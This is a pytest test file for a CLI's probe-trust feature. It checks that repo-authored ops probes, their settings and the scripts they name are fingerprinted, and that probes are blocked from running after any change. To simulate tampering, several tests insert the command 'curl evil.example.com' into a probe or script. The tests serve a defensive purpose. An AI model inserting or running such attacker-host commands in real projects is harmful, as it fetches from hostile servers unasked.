"""Probe trust (spec 2026-10-22-fr-ops R19, p1-r5 and its addendum).

Probes are repo-authored code. `fr ops trust` shows every probe and command text
and, on a terminal confirmation, writes the op set's fingerprint to a per-operator
store OUTSIDE the repo (a journal line records the grant for audit, never read).
The fingerprint covers each op, the `.fr/ops.yaml` settings that affect probes,
and every repo file a probe names. `fr ops status` runs no probe while it differs.
"""

from __future__ import annotations

import json
import os
import stat
import subprocess
from pathlib import Path

import pytest
from fr.cli import app
from fr.commands import ops_cmd
from fr.journal.model import journal_path
from fr.ops.load import LoadedOp, OpsConfig, load_ops
from fr.ops.model import Op
from fr.ops.trust import (
    CONFIG_KEY,
    Trusted,
    diff,
    fingerprint,
    grant_trust,
    load_trust,
    repo_key,
    set_hash,
    store_path,
    trust_dir,
)
from typer.testing import CliRunner

runner = CliRunner()
PLAN_REL = "docs/superpowers/plans/p"
OPS = """schema_version: 1
ops:
  - id: create-key
    summary: Create the deploy key
    phase: pre-merge
    check: 'true'
  - id: rotate
    summary: Rotate the token
    phase: post-merge
    check: 'touch probe-ran; bash scripts/probe.sh'
    identities: [admin]
"""
CONFIG = "identities:\n  admin:\n    env:\n      TOKEN: {from: 'echo tok'}\n"


def _repo(tmp_path: Path) -> Path:
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    plan = tmp_path / PLAN_REL
    plan.mkdir(parents=True)
    (plan / "ops.yaml").write_text(OPS)
    (tmp_path / ".fr").mkdir()
    (tmp_path / ".fr/ops.yaml").write_text(CONFIG)
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts/probe.sh").write_text("true\n")
    return tmp_path


def _lo(**fields: object) -> LoadedOp:
    data: dict[str, object] = {"id": "a", "summary": "s", "phase": "pre-merge", "check": "true"}
    data.update(fields)
    return LoadedOp(Op.model_validate(data), Path("ops.yaml"), 1)


def _fp(ops: list[LoadedOp], config: OpsConfig | None = None, root: Path | None = None):
    return fingerprint(ops, config or OpsConfig(), root or Path("/nonexistent-root"))


# --- the fingerprint ---------------------------------------------------------------


def test_the_fingerprint_is_stable_and_moves_with_any_probe_text() -> None:
    one = _fp([_lo(), _lo(id="b")])
    assert one == _fp([_lo(id="b"), _lo()])  # order-free
    assert set_hash(one) == set_hash(dict(reversed(list(one.items()))))
    assert _fp([_lo(check="false"), _lo(id="b")])["a"] != one["a"]


@pytest.mark.parametrize(
    "settings",
    [
        {"identities": {"x": {"env": {"T": {"from": "echo b"}}}}},
        {"env_passthrough": ["KUBECONFIG"]},
        {"timeout_seconds": 5},
        {"runbook": "ops/other.yaml"},
    ],
)
def test_the_fingerprint_covers_the_probe_settings(settings: dict[str, object]) -> None:
    """Addendum (b): identities, env_passthrough, timeout_seconds, runbook."""
    base = OpsConfig.model_validate({"identities": {"x": {"env": {"T": {"from": "echo a"}}}}})
    moved = OpsConfig.model_validate({**base.model_dump(by_alias=True), **settings})
    ops = [_lo(identities=["x"])]
    assert _fp(ops, base)[CONFIG_KEY] != _fp(ops, moved)[CONFIG_KEY]


def test_the_fingerprint_covers_every_repo_file_a_probe_names(tmp_path: Path) -> None:
    """Addendum (c): a token that resolves to a regular file inside the repo."""
    (tmp_path / "scripts").mkdir()
    script = tmp_path / "scripts/check.sh"
    script.write_text("exit 0\n")
    (tmp_path / "helper.py").write_text("x = 1\n")
    outside = tmp_path.parent / "outside.sh"
    outside.write_text("x\n")
    config = OpsConfig.model_validate(
        {"identities": {"x": {"env": {"T": {"from": "cat helper.py"}}}}}
    )
    ops = [_lo(check="bash scripts/check.sh;echo ok", apply=f"sh {outside}", identities=["x"])]
    fp = fingerprint(ops, config, tmp_path)
    assert "file:scripts/check.sh" in fp and "file:helper.py" in fp
    assert not [k for k in fp if "outside" in k]
    script.write_text("curl evil.example.com\n")
    assert (
        fingerprint(ops, config, tmp_path)["file:scripts/check.sh"] != fp["file:scripts/check.sh"]
    )


def test_diff_names_added_changed_and_removed() -> None:
    trusted_fp = _fp([_lo(), _lo(id="b")])
    now = _fp([_lo(check="false"), _lo(id="c")])
    d = diff(now, Trusted(sha256=set_hash(trusted_fp), ops=trusted_fp, granted="t"))
    assert (d.added, d.changed, d.removed) == (["c"], ["a"], ["b"])
    assert not diff(trusted_fp, Trusted(set_hash(trusted_fp), trusted_fp, "t")).untrusted
    assert diff(now, None).added == sorted(now)


# --- the store ---------------------------------------------------------------------


def test_the_store_dir_honours_the_override_then_xdg_then_home(monkeypatch, tmp_path: Path) -> None:
    monkeypatch.setenv("FR_OPS_TRUST_DIR", str(tmp_path / "o"))
    assert trust_dir() == tmp_path / "o"
    monkeypatch.delenv("FR_OPS_TRUST_DIR")
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "x"))
    assert trust_dir() == tmp_path / "x/fr/ops-trust"
    monkeypatch.delenv("XDG_STATE_HOME")
    monkeypatch.setenv("HOME", str(tmp_path / "h"))
    assert trust_dir() == tmp_path / "h/.local/state/fr/ops-trust"


def test_the_repo_key_is_the_origin_slug_else_the_dir_name(tmp_path: Path) -> None:
    root = _repo(tmp_path / "MyRepo")
    assert repo_key(root) == "MyRepo"
    subprocess.run(
        [
            "git",
            "-C",
            str(root),
            "remote",
            "add",
            "origin",
            "https://github.com/Derio-Net/Super-FR.git",
        ],
        check=True,
    )
    assert repo_key(root) == "derio-net--super-fr"


def test_a_grant_is_stored_outside_the_repo_0600_and_audited(tmp_path: Path) -> None:
    root = _repo(tmp_path / "r")
    fp = fingerprint(load_ops(root / PLAN_REL, root).ops, OpsConfig(), root)
    first = grant_trust(root, "p", fp)
    second = grant_trust(root, "p", {**fp, "x": "0" * 64})
    path = store_path(root, "p")
    assert not path.is_relative_to(root)
    assert stat.S_IMODE(os.stat(path).st_mode) == 0o600
    stored = json.loads(path.read_text())
    assert stored["sha256"] == set_hash({**fp, "x": "0" * 64})
    loaded = load_trust(root, "p")
    assert loaded is not None and "x" in loaded.ops
    assert (first.id, second.id) == ("op-trust-1", "op-trust-2")
    assert first.kind == "decision" and first.decided_by == "operator"
    assert "op-trust-2" in journal_path(root, "plan", "p").read_text()


def test_a_committed_journal_decision_grants_nothing(tmp_path: Path, monkeypatch) -> None:
    """Addendum (a): a PR author can commit a forged op-trust decision whose hash
    matches; trust is read only from the operator's store."""
    root = _repo(tmp_path / "r")
    grant_trust(root, "p", fingerprint(load_ops(root / PLAN_REL, root).ops, OpsConfig(), root))
    store_path(root, "p").unlink()  # the journal keeps the matching audit line
    assert "op-trust-1" in journal_path(root, "plan", "p").read_text()
    assert load_trust(root, "p") is None
    monkeypatch.chdir(root)
    result = runner.invoke(app, ["ops", "status", "--plan", PLAN_REL])
    assert result.exit_code == 2 and "fr ops trust" in result.output
    assert not (root / "probe-ran").exists()


# --- the CLI ---------------------------------------------------------------------


def _trust(root: Path, monkeypatch, answer: str = "y\n", interactive: bool = True):
    monkeypatch.chdir(root)
    monkeypatch.setattr(ops_cmd, "_interactive", lambda: interactive)
    return runner.invoke(app, ["ops", "trust", "--plan", PLAN_REL], input=answer)


def test_trust_shows_every_probe_and_command_and_records_on_yes(
    tmp_path: Path, monkeypatch
) -> None:
    root = _repo(tmp_path)
    result = _trust(root, monkeypatch)
    assert result.exit_code == 0, result.output
    assert "touch probe-ran; bash scripts/probe.sh" in result.stdout
    assert "scripts/probe.sh" in result.stdout.split("files:")[1]  # the files it hashed
    assert "timeout_seconds" in result.stdout  # the probe settings
    assert "echo tok" in result.stdout  # the identity's from: command
    assert "op-trust-1" in result.stdout
    assert "op-trust-1" in journal_path(root, "plan", "p").read_text()
    assert load_trust(root, "p") is not None


def test_trust_refuses_without_a_terminal(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    result = _trust(root, monkeypatch, interactive=False)
    assert result.exit_code == 2
    assert "terminal" in result.output
    assert not journal_path(root, "plan", "p").exists()
    assert load_trust(root, "p") is None


def test_trust_declined_writes_nothing(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    result = _trust(root, monkeypatch, answer="n\n")
    assert result.exit_code == 1
    assert not journal_path(root, "plan", "p").exists()


def test_trusting_an_already_trusted_set_writes_nothing(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    _trust(root, monkeypatch)
    before = journal_path(root, "plan", "p").read_text()
    again = _trust(root, monkeypatch)
    assert again.exit_code == 0 and "already trusted" in again.stdout
    assert journal_path(root, "plan", "p").read_text() == before


def _status(root: Path, monkeypatch):
    monkeypatch.chdir(root)
    return runner.invoke(app, ["ops", "status", "--plan", PLAN_REL])


def test_status_refuses_an_untrusted_set_and_runs_no_probe(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    result = _status(root, monkeypatch)
    assert result.exit_code == 2
    assert "fr ops trust" in result.output
    assert "create-key" in result.output and "rotate" in result.output
    assert not (root / "probe-ran").exists()


def test_status_runs_once_trusted(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    _trust(root, monkeypatch)
    result = _status(root, monkeypatch)
    assert result.exit_code == 0, result.output
    assert (root / "probe-ran").exists()


def test_status_refuses_after_a_probe_changes_and_names_it(tmp_path: Path, monkeypatch) -> None:
    root = _repo(tmp_path)
    _trust(root, monkeypatch)
    ops = root / PLAN_REL / "ops.yaml"
    ops.write_text(ops.read_text().replace("touch probe-ran;", "curl evil.example.com;"))
    result = _status(root, monkeypatch)
    assert result.exit_code == 2
    assert "changed: rotate" in result.output
    assert "create-key" not in result.output.split("changed:")[1]


def test_no_help_text_calls_a_probe_read_only() -> None:
    for args in (["ops", "--help"], ["ops", "status", "--help"], ["ops", "trust", "--help"]):
        out = runner.invoke(app, args).output.lower()
        assert "read-only" not in out and "reads only" not in out, args


def test_status_refuses_after_a_referenced_script_changes(tmp_path: Path, monkeypatch) -> None:
    """Addendum (c): editing a script a probe runs invalidates trust."""
    root = _repo(tmp_path)
    _trust(root, monkeypatch)
    (root / "scripts/probe.sh").write_text("curl evil.example.com\n")
    result = _status(root, monkeypatch)
    assert result.exit_code == 2
    assert "changed: file:scripts/probe.sh" in result.output
    assert not (root / "probe-ran").exists()


def test_status_refuses_after_a_probe_setting_changes(tmp_path: Path, monkeypatch) -> None:
    """Addendum (b): `.fr/ops.yaml` settings are their own entry in the diff."""
    root = _repo(tmp_path)
    _trust(root, monkeypatch)
    (root / ".fr/ops.yaml").write_text(CONFIG + "env_passthrough: [AWS_PROFILE]\n")
    result = _status(root, monkeypatch)
    assert result.exit_code == 2
    assert f"changed: {CONFIG_KEY}" in result.output
